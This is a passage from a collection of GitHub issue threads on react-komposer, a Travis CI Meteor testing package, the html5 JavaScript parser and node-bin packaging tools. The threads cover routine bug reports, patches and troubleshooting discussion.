  const cleanup = () =&gt; clearInterval(handle);
  return cleanup;
};

export const depsMapper = (context, actions) =&gt; ({
  updateTime: actions.clock.updateTime,
  context: () =&gt; context,
});

// need useDeps to inject context, from where we take out Store object
export default composeAll(
  compose(composer),
  useDeps(depsMapper),
)(Time);
```

However, the store update resulted from the action dispatch in componentDidMount() doesn't get picked up by `onData(null, { time: time.toString() });`. I guess it was loaded before `componentDidMount()` and `Store.subscribe()` only gets to update the clock 1 second later. I think I wish to know in general how lifecycle methods can play well with react-komposer.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>There's no big issue with the general lifecycle hooks. if you call `onData` on the top of the composer, you component get's data via proper immediately. After that, every call to onData will result in getting data.
</Body>
    </Comment>
  </Issue_304>
  <Issue_305>
    <Repository>react-komposer</Repository>
    <Title>Compiling Komposer into App with Rollup throws "Does not Export Compose"</Title>
    <Owner>arunoda</Owner>
    <Body>I was trying to bundle React-Komposer into my react project but when I try to use CommonJS &amp; Node Resolver to import it, I get thrown the following error: 

`[Error: Module C:\Users\*******.******\Desktop\*******\JSApps\node_modules\react-komposer\index.js does not export compose (imported by C:\Users\*****.******\Desktop\*******\JSApps\containers\******UI.js)]`
</Body>
    <State>open</State>
    <Comment>
      <Owner>wormyy</Owner>
      <Body>How are your importing the `react-komposer`?
</Body>
    </Comment>
    <Comment>
      <Owner>mgarf</Owner>
      <Body>import {compose} from 'react-komposer';
</Body>
    </Comment>
  </Issue_305>
  <Issue_306>
    <Repository>react-komposer</Repository>
    <Title>Waiting on Meteor Method data, with Flow-Router SSR and Fast-Render</Title>
    <Owner>arunoda</Owner>
    <Body>This is a complex issue but I'll try to describe it. With collection data, we have the following flow when we make a new request:
- Simulate the subscription in React Komposer on the server.
- Flow-Router SSR gets the data on the server and generates markup.
- Show SSR-generated markup.
- Fast-Render gets the data on the server and injects it in the document. 
- Subscribe instantly in React Komposer on the client.
- Show app.

This means that when the user loads the app, A) the page is immediately populated with the server-generated markup and B) Minimongo is immediately populated with the fast-render generated data. So (if I'm not mistaken) `Meteor.subscribe('posts').ready()` in React Komposer will always return `true` on first load, and that's what we're not seeing any loading screens when using Flow-Router SSR. 

Now if the data is instead coming from a _method_, this doesn't quite work as well. Let's say that you have a single value stored on the server you want to make available to your whole app before it's loaded (in my case, the server timezone). 

First of all `Meteor.call` is not reactive, so we have to use [reactive method](https://github.com/stubailo/meteor-reactive-method) instead. 

But even so, we have the issue that there is no Fast-Render equivalent for methods or arbitrary variables. So if we want to wait for the result of this method, we can't bypass our "loading&#8230;" screen, which defeats the point of having SSR in the first place. 

In other words, with a method the flow becomes:
- Simulate the method call in React Komposer on the server.
- Flow-Router SSR gets the method data on the server and generates markup.
- Show SSR-generated markup.
- Subscribe in React Komposer on the client.
- **Show loading.** (bad!)
- Subscription is ready
- Show app.

I'm not sure how I can get around this, apart from not using methods at all&#8230; Any ideas?
</Body>
    <State>open</State>
    <Comment>
      <Owner>SachaG</Owner>
      <Body>OK, so I think the solution is to use the [inject-initial](https://github.com/meteorhacks/meteor-inject-initial) package instead of methods, in order to make the data available right from the start. 

The only problem is that I don't see a way to send authenticated data using this method (i.e. data that is not part of a collection, but is only available depending on the current user) but it shouldn't matter for my use case. 
</Body>
    </Comment>
    <Comment>
      <Owner>lmachens</Owner>
      <Body>Can you take a look at https://github.com/kadirahq/flow-router/issues/655 ?
Looks like it is a similar problem.
</Body>
    </Comment>
    <Comment>
      <Owner>sahanDissanayake</Owner>
      <Body>So @SachaG did you find a solution please ?
</Body>
    </Comment>
    <Comment>
      <Owner>SachaG</Owner>
      <Body>I did find a workaround, see above. 
</Body>
    </Comment>
    <Comment>
      <Owner>sahanDissanayake</Owner>
      <Body>So with React FlowRouter SSR initial data is already injected to the page. so I dont know why I should use something like this again ?

Did you had the same issue as described here ? https://github.com/kadirahq/flow-router/issues/655 
</Body>
    </Comment>
    <Comment>
      <Owner>sahanDissanayake</Owner>
      <Body>`&lt;script type="text/inject-data"&gt;%7B%22fast-render-`
</Body>
    </Comment>
    <Comment>
      <Owner>SachaG</Owner>
      <Body>FlowRouter SSR will inject two things: 

1) the HTML markup
2) the initial collections data (via fast-render)

My use case was that I needed to access some other arbitrary piece of dynamic data that was not stored in a collection. So it's different from the issue you refer to, which concerns collection data.
</Body>
    </Comment>
    <Comment>
      <Owner>sahanDissanayake</Owner>
      <Body>Right. Ok thanks.. I knew 30% my issue would be different. 
</Body>
    </Comment>
  </Issue_306>
  <Issue_307>
    <Repository>react-komposer</Repository>
    <Title>Is this the intended behavior for {pure: false}?</Title>
    <Owner>arunoda</Owner>
    <Body>Hi guys. I'm using `react-komposer` with `composeWithTracker` and receiving fewer renders from my composer function than I would expect. Setting `{pure: false}` fixes the issue, only I don't understand why because the props being sent to render are obviously not shallowly equal and should trigger a re-render each time, even without `{pure: false}`. I'm wondering if this is the intended behavior. Here's some code:

``` js
import React from 'react';
import { composeWithTracker } from 'react-komposer';
import DataError from './DataError.js';
import Loading from './Loading.js';

const Composer = (props, onData) =&gt; {
  const status = Meteor.status();
  onData(null, status);
}

// a quick autorun for illustration to compare against the render below
Tracker.autorun(() =&gt; {
  const status = Meteor.status();
  console.log('autorun:', status);
});

const WebApp = (props) =&gt; {
  console.log('rendered:', props.status);
  return &lt;div&gt;&lt;/div&gt;;
};

export default composeWithTracker(Composer, Loading, DataError)(WebApp);
```

The above produces from the console:

``` js
autorun: Object {status: "connected", connected: true, retryCount: 0}
rendered: Object {status: "connected", connected: true, retryCount: 0}

&gt; Meteor.disconnect();
autorun: Object {status: "offline", connected: false, retryCount: 0}
rendered: Object {status: "offline", connected: false, retryCount: 0}

&gt; Meteor.reconnect();
autorun: Object {status: "connecting", connected: false, retryCount: 0}
autorun: Object {status: "connected", connected: true, retryCount: 0}
// no re-render here on 'status: connecting'
// no re-render here on 'status: connected'
```

If I set `{ pure: false }` with `composeWithTracker(Composer, Loading, DataError, {pure: false})(WebApp)` I receive the missing re-renders, but I don't understand why they are not occurring otherwise. The objects sent to props do not pass a shallow compare when `{status: 'offline'}` moves to `{status: 'connecting'}` etc. Am I missing something here?
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>That's weird. I'll check why.
</Body>
    </Comment>
    <Comment>
      <Owner>fabiokandrade</Owner>
      <Body>The same for me. But it seems to be happening only with Meteor.status(). 
Has this happened in other cases for you @JeremySaks ?
</Body>
    </Comment>
    <Comment>
      <Owner>JeremySaks</Owner>
      <Body>I'm seeing it in other circumstances too, but I haven't found a pattern.
Right now I'm adding `{ pure: false }` to every reactive container.
</Body>
    </Comment>
    <Comment>
      <Owner>sahanDissanayake</Owner>
      <Body>there is a bug related to this issue maybe ?
https://forums.meteor.com/t/react-komposer-render-crazy-amounts-of-times-when-collection-updated/25518/3
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Hi guys, sorry for the delay. This is a bug, bug we are not responsible for this.
Here you directly pass the object returned by `Meteor.status()`. 

So, what's happen is we assign this object in the component state. When there's a change, we compare that with the new one.

But here, Meteor update this reference object itself. So, in the shallowEqual stage, both objects are the same. (This is true, even if we did a deepEqual).

So, do this and follow this approach.

``` js
const Composer = (props, onData) =&gt; {
  const status = Meteor.status();
  // do this or clone the status object
  const data = { status: status.status };
  onData(null, data);
}
```
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>@sahanDissanayake This is not related.
</Body>
    </Comment>
  </Issue_307>
  <Issue_308>
    <Repository>react-komposer</Repository>
    <Title>Curry function of composeAll needs an input.</Title>
    <Owner>arunoda</Owner>
    <Body>Getting this error a _lot_ using react-komposer 1.3.1 as shipped with mantra-core.

I acknowledge that this isn't a very helpful bug report as I can't create an easy reproduction. FWIW, the code that triggers it is:

```
import {useDeps} from "mantra-core"

import ResetPassword from "../components/reset_password.jsx"

console.log("ResetPassword", useDeps()(ResetPassword))

export default useDeps()(ResetPassword)
```

And I can't pin down what's causing it. If I change ResetPassword to a dirt simple `&lt;p&gt;It worked&lt;/p&gt;` component, I still get the error. If I switch back to a more verbose container that lumped the Mantra action in with the container and uses composeAll/a composer function, it works. I'd blame the container, but I'm literally using the very same code in several others (with component names changed, of course) and it works fine. I'm guessing somewhere in the render chain is getting an undefined component, but this error message is not very helpful.

Can it be made more so, giving a component name, the value it actually received, etc.?

Also, is there a chance an error is being swallowed somewhere? In the past when I've hit this, I've found errors in child components that should have been reported but weren't. Given that, I'm wondering if something in the component composition isn't reporting errors correctly. If I remove the container and render the component directly, everything is fine (except for the fact that it isn't getting its data, of course.)

Thanks.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>This error comes when you are using `composeAll` and not passing a component.
Here's the related test: [See](https://github.com/kadirahq/react-komposer/blob/5d2d47859384c3cc112f2672ecad1dbb5ab72cca/lib/__tests__/compose_all.js#L30)
</Body>
    </Comment>
    <Comment>
      <Owner>ndarilek</Owner>
      <Body>Right, I just wonder if it might be made more helpful. Maybe you could 
iterate through the list of passed components and display their names so 
I know which composeAll is failing?

I'm dealing with [this 
issue](https://github.com/meteor/meteor/issues/6364) which looks like 
either a Meteor module failure or something too subtle for me to spot. 
But, either way, the code I'm changing is not a composeAll call and this 
is the exception I'm getting, so it would be useful if it could help me 
to pinpoint which composeAll call is failing.
</Body>
    </Comment>
    <Comment>
      <Owner>ndarilek</Owner>
      <Body>So I have a minimal reproduction of an app that demonstrates this error. It uses mantra-core, and the issue seems to go away when I eliminate a container and render my UI components directly. If I comment out an import for an unused module, my app works. With the import, it crashes with the error in this issue title, and the entire module containing the import fails to load (thus resulting in the UI component being undefined and, in turn, this error.)

I don't know if it's an issue with mantra-core, react-komposer, Meteor 1.3 modules or my own code. If the issue was in my own code, I'd expect to get better error reports in my console logs. Since I don't know where the issue lies, I'm posting it here too, because I don't see it if I just ditch containers and render my UI components directly.

[Here is the reproduction](https://github.com/ndarilek/meteor-modules-mystery), and [here is the related Meteor issue](https://github.com/meteor/meteor/issues/6364).

Thanks.
</Body>
    </Comment>
  </Issue_308>
  <Issue_309>
    <Repository>react-komposer</Repository>
    <Title>Watch props changes automatically</Title>
    <Owner>arunoda</Owner>
    <Body>Get a list of props used by the composer function. Then re-run the composer function if they changed.
This will fix #1 
</Body>
    <State>open</State>
    <Comment>
      <Owner>roberto68</Owner>
      <Body>do you mean do this `const Clock = compose(composerFunction)(Time);`  https://jsfiddle.net/arunoda/wm6romh for every component like Time - if there's another component like Timer I should do `const TimerClock = compose(composerFunction)(Timer);`  
Second question.
what about the case I've some user initiated update do DB (method call in redux) and then receive changed data from server by subscribing that composerFunction to meteor publish (from server) = not like in you that example to redux store
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Hey @roberto68.

I'm sorry but I don't clear the question.
</Body>
    </Comment>
    <Comment>
      <Owner>roberto68</Owner>
      <Body>I mean rerun the composerFunction. if there is component Timer I should do `const TimerClock = compose(composerFunction)(Timer);` and I edit that second part of my question, so it should be clear now
</Body>
    </Comment>
    <Comment>
      <Owner>markshust</Owner>
      <Body>I need to pass props through the container to child components, however it appears that any prop change sent to the container still triggers a rererun.

I looked through the code, and am looking for best way to implement this. Would it make sense to create a new option, sort of like `pure`, which is named `shouldComponentUpdate`, and if that prop exists, return that function instead of what's returning here?
https://github.com/kadirahq/react-komposer/blob/master/lib/index.js#L84

Let me know if that approach looks good and I'll submit a PR for this.
</Body>
    </Comment>
    <Comment>
      <Owner>markshust</Owner>
      <Body>Just submitted a PR for a start. This adds a new option `shouldComponentUpdate`, which receives a function that acts like standard shouldComponentUpdate, except instead of `nextState` as 2nd param, it is `props` (this.props). 

This only half solves my problem. Is there any way to "pass-through" a param to the child component without triggering a rerun on the container component? I'd like to not rerun the container, but re-render some specific child components.
</Body>
    </Comment>
    <Comment>
      <Owner>sahanDissanayake</Owner>
      <Body>Whats the status of this ? is there a solution? https://forums.meteor.com/t/react-komposer-render-crazy-mounts-of-times-when-collection-updated/25518/3
</Body>
    </Comment>
  </Issue_309>
  <Issue_310>
    <Repository>travis-ci-meteor-packages</Repository>
    <Title>"This job ran on our legacy infrastructure"</Title>
    <Owner>arunoda</Owner>
    <Body>I'm seeing the following message on Travis builds now:

![image](https://cloud.githubusercontent.com/assets/2080084/8662102/a830ddd6-298a-11e5-8a48-6d8039f7f7a7.png)

The link points to the following:

http://docs.travis-ci.com/user/migrating-from-legacy/

It seems the only condition for this is to not use `sudo`; is there a quick fix or something that could switch this over?
</Body>
    <State>open</State>
    <Comment>
      <Owner>mizzao</Owner>
      <Body>May have something to do with #38?
</Body>
    </Comment>
    <Comment>
      <Owner>mitar</Owner>
      <Body>I think you should just ignore this warning for now. Let them allow `sudo` in Docker.

&gt; If you require sudo, for instance to install Ubuntu packages, a workaround is to use precompiled binaries, uploading them to S3 and downloading them as part of your build,then installing them into a non-root directory.

I think the workaround is pretty ugly. :-)
</Body>
    </Comment>
    <Comment>
      <Owner>mizzao</Owner>
      <Body>Okay :-) I just wasn't sure what part of this testing package required sudo, or if it was essential to make things work.
</Body>
    </Comment>
  </Issue_310>
  <Issue_311>
    <Repository>travis-ci-meteor-packages</Repository>
    <Title>Travis build looping for ever</Title>
    <Owner>arunoda</Owner>
    <Body>Well just look at:
https://travis-ci.org/Differential/accounts-entry/builds/49874221

The 7 tests are looping forever.
</Body>
    <State>open</State>
    <Comment>
      <Owner>mizzao</Owner>
      <Body>I'm having similar (not sure if identical) issues in #36.
</Body>
    </Comment>
    <Comment>
      <Owner>mizzao</Owner>
      <Body>@spitis pointed out that the build may work differently in Linux and OS X. If you have a mac, you should try to run the tests locally and see what happens.

It seems to be due to weird bugs in PhantomJS and the Websocket connection to the Meteor server.
</Body>
    </Comment>
    <Comment>
      <Owner>mizzao</Owner>
      <Body>In your case you seemed to be using 0.8, and fixed it by putting 0.10. You should probably close this issue.
</Body>
    </Comment>
    <Comment>
      <Owner>fix</Owner>
      <Body>It is not fixed. The build terminates, but the tests are run hundreds of times
</Body>
    </Comment>
  </Issue_311>
  <Issue_312>
    <Repository>html5</Repository>
    <Title>The combination of contentHandler and lexicalHandler</Title>
    <Owner>aredridel</Owner>
    <Body>You have written this:

"No. There is a lexicalHandler, that can handle comments, doctype, cdata sections. But this feature is not implemented yet (but it is very easy to do)."

Are you going to do this?)

I mean, it would be great if you could combine contentHandler and lexicalHandler into one Handler!

This way, everybody will be able to create the DOM tree of HTML code in manner as they want!
</Body>
    <State>open</State>
    <Comment>
      <Owner>danyaPostfactum</Owner>
      <Body>You can combine both handlers, there are no limitations.

``` javascript
parser.contentHandler = parser.lexicalHandler = {
    /* implement both interfaces */
};
```

These interfaces are described by SAX project:
http://www.saxproject.org/apidoc/org/xml/sax/ContentHandler.html
http://www.saxproject.org/apidoc/org/xml/sax/ext/LexicalHandler.html

By the way, I was wrong about CDATA sections: HTML5 tokenizer does not produce these.
CDATA is illegal in HTML(treated as comment), but allowed in foreign content, such as SVG or MathML.
</Body>
    </Comment>
  </Issue_312>
  <Issue_313>
    <Repository>html5</Repository>
    <Title>Parser changes to match coming update to the spec for the new ruby model</Title>
    <Owner>aredridel</Owner>
    <Body>As per http://darobin.github.io/html-ruby/. This change is being landed in the W3C specification (within the days to come), apply with caution.
</Body>
    <State>open</State>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>Are there any test cases easily added for this?
</Body>
    </Comment>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>And can you match the indentation style?
</Body>
    </Comment>
    <Comment>
      <Owner>darobin</Owner>
      <Body>Test cases are in here: https://github.com/w3c/web-platform-tests/pull/463 I assumed that you used the same test suite (though I confess I didn't look at your test system and basically ran those through a quick throwaway script).

Concerning indent style, I thought I'd matched &#8212; I'll double check.
</Body>
    </Comment>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>Yeah, I've been using a portion of that suite, originally imported from html5lib's tree. I'm in the process of making it more maintainable / easier to update, but it's a static copy at the moment.
</Body>
    </Comment>
  </Issue_313>
  <Issue_314>
    <Repository>html5</Repository>
    <Title>LineNumber/ColumnNumber for errors?</Title>
    <Owner>aredridel</Owner>
    <Body>I need locations of parse errors. Tokenizer should track current line and number.

&lt;!---
@huboard:{"order":27.03125}
--&gt;
</Body>
    <State>open</State>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>Pull request happily accepted! I'll definitely consider that for the tokenizer refactor though.
</Body>
    </Comment>
  </Issue_314>
  <Issue_315>
    <Repository>html5</Repository>
    <Title>Patch: Failed comparison of activeFormattingElements entry with Marker</Title>
    <Owner>aredridel</Owner>
    <Body>On node 0.6.3 and html5 v0.3.5, parsing multiple page fragments with the same parser sometimes causes failures in the treebuilder, which are caused by a pointer-unequal marker element in reconstructActiveFormattingElements and elementInActiveFormattingElements. The problem is mainly triggered if the parsed fragments contain tables.

The following patch converts the pointer equality based check into a node type check, which fixes the problem for me:

```
--- treebuilder.js      2011-11-28 21:30:17.675749830 +0100
+++ /usr/lib/node_modules/html5/lib/html5/treebuilder.js        2011-11-28 20:21:38.067593170 +0100
@@ -224,9 +224,9 @@
        // Step 2 and 3: start with the last element
        var i = this.activeFormattingElements.length - 1;
        var entry = this.activeFormattingElements[i];
-       if(entry == HTML5.Marker || this.open_elements.indexOf(entry) != -1) return;
+       if(entry.type == HTML5.Marker.type || this.open_elements.indexOf(entry) != -1) return;

-       while(entry != HTML5.Marker &amp;&amp; this.open_elements.indexOf(entry) == -1) {
+       while(entry.type != HTML5.Marker.type &amp;&amp; this.open_elements.indexOf(entry) == -1) {
                i -= 1;
                entry = this.activeFormattingElements[i];
                if(!entry) break;
@@ -248,7 +248,7 @@
 b.prototype.elementInActiveFormattingElements = function(name) {
        var els = this.activeFormattingElements;
        for(var i = els.length - 1; i &gt;= 0; i--) {
-               if(els[i] == HTML5.Marker) break;
+               if(els[i].type == HTML5.Marker.type) break;
                if(els[i].tagName.toLowerCase() == name) return els[i];
        }
        return false;
```

&lt;!---
@huboard:{"order":26.5}
--&gt;
</Body>
    <State>open</State>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>Hm. It doesn't happen for me with this test case:

``` javascript
var HTML5 = require('../../lib/html5'),
    test = require('tap').test;

test("test 1", function(t) {
    var p = new HTML5.Parser()
    p.parse("&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;Hello&lt;/td&gt;&lt;/tr&gt;&lt;/table&lt;/body&gt;");
    p.parse("&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;Hello&lt;/td&gt;&lt;/tr&gt;&lt;/table&lt;/body&gt;");
    t.pass("Works");
    t.end();
});
```

Do you have test data that triggers it?
</Body>
    </Comment>
    <Comment>
      <Owner>gwicke</Owner>
      <Body>I can trigger it reliably when running through MediaWiki's 600-odd parser tests, but have not yet been able to reproduce it in a minimal test case in the shell. The error always occurs in the same test cases, all related to tables. The first string that triggers it is `&lt;body&gt;&lt;table&gt;&lt;caption&gt; caption&lt;/caption&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/body&gt;`. This is the second table test case, following `&lt;body&gt;&lt;table&gt;&lt;/table&gt;&lt;/body&gt;`. The tests preceding these tables are about unbalanced formatting elements.

I'll see if I can track down where the second marker is coming from, or if I can create a minimal test case.
</Body>
    </Comment>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>Awesome. Or just a link to the parser tests would rock, I'll poke at it too.
</Body>
    </Comment>
    <Comment>
      <Owner>gwicke</Owner>
      <Body>I just added the information needed to try it at https://www.mediawiki.org/wiki/Future/Parser_development#Trying_it_out. If you search for 'normalize' in the output you should find the error messages from the parser. I use less -R as a searchable viewer with color.

The code generating the error is all in parserTests.js. Basically, we use the stock html parser to parse and re-serialize the expected test output (for normalization). This part is where the failure occurs. We also use a hacked-up tree builder in a separate module as a backend for our wiki parser, but that should not affect the plain use of the npm module as the namespaces are separate.
</Body>
    </Comment>
  </Issue_315>
  <Issue_316>
    <Repository>html5</Repository>
    <Title>Make the tokenizer able to be run separately</Title>
    <Owner>aredridel</Owner>
    <Body>Do this while minimally involving parser for state transitions between tokenizing modes.

&lt;!---
@huboard:{"order":28.0}
--&gt;
</Body>
    <State>open</State>
    <Comment>
      <Owner>gwicke</Owner>
      <Body>I am very much interested in this as well. I am using the tree builder with a custom (MediaWiki) tokenizer in a prototype I am working on currently. For now I modified the parser to take a tokenizer as an argument in parse(), but this is just a quick hack that ignores tokenizer modes completely.

Right now I am mostly working on the tokenizer, but might be able to put some effort into the interface later.
</Body>
    </Comment>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>Oh, sweet. I'm integrating the latest draft's tokenizer changes, which flattens the modes out into separate states. That should help move this along.
</Body>
    </Comment>
    <Comment>
      <Owner>papandreou</Owner>
      <Body>@aredridel: Has that work been completed? I'm thinking about updating a project to the newest version of html5 and getting rid of the state transitions in my code.
</Body>
    </Comment>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>It has not, sadly!  It's not trivial to get 100% accurate, since the HTML5 algorithms assume a document tree, and if you're not parsing fully, you don't get one. I need to rework for some of the latest spec changes, and that should simplify, since they've flattened some of the parser down into tokenizer states.
</Body>
    </Comment>
    <Comment>
      <Owner>dgreensp</Owner>
      <Body>I'm using just the tokenizer at the moment.  I was able to pull it out, but it would be nice if it was explicitly separable.
</Body>
    </Comment>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>It's hard with the revision of the spec I was originally targeting, since the parser state feeds back into the tokenizer. With the latest revision, much if not all of this is flattened out. As I migrate toward the current parsing spec, it'll smooth that out.
</Body>
    </Comment>
    <Comment>
      <Owner>dgreensp</Owner>
      <Body>Sounds great.  Thanks for writing this package, btw, it seems to be one of a kind in the JS world.
</Body>
    </Comment>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>I'm kinda surprised at how one of a kind it is, but it's needed! 
</Body>
    </Comment>
  </Issue_316>
  <Issue_317>
    <Repository>html5</Repository>
    <Title>Make the parser/tokenizer a writable stream?</Title>
    <Owner>aredridel</Owner>
    <Body>It's a nice touch that you can hand a readable stream to `parser.parse`, but it would be even more flexible if the parser was able to act as a writable stream so the stream piping logic could reside in the calling code.

Seems like this is an "emerging pattern" :)

&lt;!---
@huboard:{"order":6.25}
--&gt;
</Body>
    <State>open</State>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>Good call. I'll see what I can do! Pull requests welcome, of course. 
</Body>
    </Comment>
  </Issue_317>
  <Issue_318>
    <Repository>html5</Repository>
    <Title>Serialize outputs the doctype at the end / DOM Level2 Unavailable</Title>
    <Owner>aredridel</Owner>
    <Body>If I try to serialize out a document, html5 is outputting the doctype at the end, rather than the beginning.

My simple-ish test-case code is:

&lt;pre&gt;&lt;code&gt;var jsdom = require('jsdom');
var HTML5 = require('html5');
var window = jsdom.jsdom(null, null, {parser: HTML5, features: { QuerySelector: true }}).createWindow();
var parser = new HTML5.Parser({document: window.document});
parser.parse("&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;");
console.log(HTML5.serialize(window.document))
&lt;/code&gt;&lt;/pre&gt;


What I see outputted to console is:

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;lt;!DOCTYPE html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;


&lt;!---
@huboard:{"order":12.5}
--&gt;
</Body>
    <State>open</State>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>Alright. I'll see what I can do.
</Body>
    </Comment>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>Ah, you're getting a DOM Level 1 from JSDOM -- Level 2 is required to get doctypes right, I think.
</Body>
    </Comment>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>What I end up getting is `TypeError: Object #&lt;Object&gt; has no method 'createDocumentType'` running your code.

I'm working with @tmpvar and @isaacs to get `npm` and/or `jsdom` to export the level 2 stuff more easily to fix this properly.
</Body>
    </Comment>
    <Comment>
      <Owner>stevesims</Owner>
      <Body>I must admit that I struggled quite a bit to get html5 up and running - I've been doing browser-based JS for years, but am fairly new to node.js.  It took me a while to figure out that I needed to set up a NODE_PATH environment variable to point to places where npm was installing things, otherwise html5 was just refusing to see jsdom at all.  (Getting document.querySelector was important for me - I only managed to work that out by searching through jsdom's test code...)  Chances are I've not got things set up quite "right", which probably explains why we're seeing differing results.

For now I've worked around this problem by using a regex to move the doctype from the end of the outputted HTML to the beginning.

I'll keep an eye out for updates - would be nice to remove my bodge.  :-)
</Body>
    </Comment>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>Sweet. I'll keep working on the integration issues. It's mostly about getting jsdom's API to be more friendly to use via npm. I'll see about that!
</Body>
    </Comment>
    <Comment>
      <Owner>tmpvar</Owner>
      <Body>yeah, to be honest jsdom is pretty hosed on my local machine. I'll spend some time getting back to "a good place" this weekend
</Body>
    </Comment>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>Awesome! Poke me by twitter if you want help testing anything.
</Body>
    </Comment>
  </Issue_318>
  <Issue_319>
    <Repository>node-bin-gen</Repository>
    <Title>Support arch parameter.</Title>
    <Owner>aredridel</Owner>
    <Body>Hello,&#13;
 I can't find a way to specify the architecture of the node to install. I'm on a 64bit windows machine and I need to specify to install the ia32 (x86) version of node.&#13;
&#13;
For example would be nice:&#13;
npm install node@10.7.0-win-x86 &#13;
&#13;
L.&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>You can install `node-win-x86`, though if you need it to also support other configurations then adding that as a dependency would be counterproductive. &#13;
&#13;
Why installing with an x64 node to get an x86 binary? (Just curious what the use case is)</Body>
    </Comment>
    <Comment>
      <Owner>dianlight</Owner>
      <Body>Install node-win-x86 on an 64bit environment give me the following error:&#13;
&#13;
```&#13;
&gt; npm ERR! notsup Unsupported platform for node-win-x86@10.4.1: wanted {"os":"win32","arch":"x86"} (current: {"os":"win32","arch":"x64"})&#13;
&gt; npm ERR! notsup Valid OS:    win32&#13;
&gt; npm ERR! notsup Valid Arch:  x86&#13;
&gt; npm ERR! notsup Actual OS:   win32&#13;
&gt; npm ERR! notsup Actual Arch: x64&#13;
```&#13;
&#13;
My uses case is quite complex to describe:&#13;
"A node application with native modules release as single binary."&#13;
&#13;
- The deveopers PC are mixed windows 32bit and 64bit&#13;
- The central build machine is a windows 64bit with a shared installed node ( 64bit fixed version 8). Every project needed to install its enviroment ( node, modules etc ) before the build process.  &#13;
- The native modules ( C/C++ ) needed to be compiled with the exact version and arch as the final packed exe file.&#13;
&#13;
For the moment I have some post install custom script that unpack and link the  right node version in the project but is not the optimal solution.&#13;
&#13;
Regrads&#13;
L.&#13;
</Body>
    </Comment>
  </Issue_319>
  <Issue_320>
    <Repository>node-bin-gen</Repository>
    <Title>node installArchSpecificPackage fails</Title>
    <Owner>aredridel</Owner>
    <Body>11:18:21 &gt; node@11.1.0 preinstall /var/lib/jenkins/jobs/eds-services-emv/workspace/eds-account-manager/node_modules/.staging/node-af0ef559&#13;
11:18:21 &gt; node installArchSpecificPackage&#13;
11:18:21 &#13;
11:18:21 module.js:341&#13;
11:18:21     throw err;&#13;
11:18:21     ^&#13;
11:18:21 &#13;
11:18:21 Error: Cannot find module 'node-bin-setup'&#13;
11:18:21     at Function.Module._resolveFilename (module.js:339:15)&#13;
11:18:21     at Function.Module._load (module.js:290:25)&#13;
11:18:21     at Module.require (module.js:367:17)&#13;
11:18:21     at require (internal/module.js:20:19)&#13;
11:18:21     at Object.&lt;anonymous&gt; (/var/lib/jenkins/jobs/eds-services-emv/workspace/eds-account-manager/node_modules/.staging/node-af0ef559/installArchSpecificPackage.js:1:63)&#13;
11:18:21     at Module._compile (module.js:413:34)&#13;
11:18:21     at Object.Module._extensions..js (module.js:422:10)&#13;
11:18:21     at Module.load (module.js:357:32)&#13;
11:18:21     at Function.Module._load (module.js:314:12)&#13;
11:18:21     at Function.Module.runMain (module.js:447:10)</Body>
    <State>open</State>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>What gives this error message? </Body>
    </Comment>
    <Comment>
      <Owner>naz-mul</Owner>
      <Body>@aredridel this happened during a build. I am assuming that's what you are asking me?&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>rmg</Owner>
      <Body>I get this when using npm@3.10.10 (shipped with node 6).</Body>
    </Comment>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>Oh interesting. I'll have to see if I can replicate this</Body>
    </Comment>
  </Issue_320>
  <Issue_321>
    <Repository>node-bin-setup</Repository>
    <Title>Use symbolic links instead of hard links</Title>
    <Owner>aredridel</Owner>
    <Body>This specifically fixes an issue with creating hard links in a synced folder in a Vagrant VM, as well as potential issues with linking to files without specific permissions/ownership.</Body>
    <State>open</State>
    <Comment>
      <Owner>aredridel</Owner>
      <Body>Oh neat! How did you test this?</Body>
    </Comment>
    <Comment>
      <Owner>prograhamer</Owner>
      <Body>I took your https://github.com/aredridel/node-bin-gen repo, generated a local node binary package, changing the `package.json` to use my `node-bin-setup` branch, i.e.:&#13;
```json&#13;
{&#13;
  "name": "node-bin",&#13;
  "version": "8.2.1",&#13;
  "description": "node",&#13;
  "main": "index.js",&#13;
  "keywords": [&#13;
    "runtime"&#13;
  ],&#13;
  "scripts": {&#13;
    "preinstall": "node installArchSpecificPackage"&#13;
  },&#13;
  "bin": {&#13;
    "node": "bin/node"&#13;
  },&#13;
  "dependencies": {&#13;
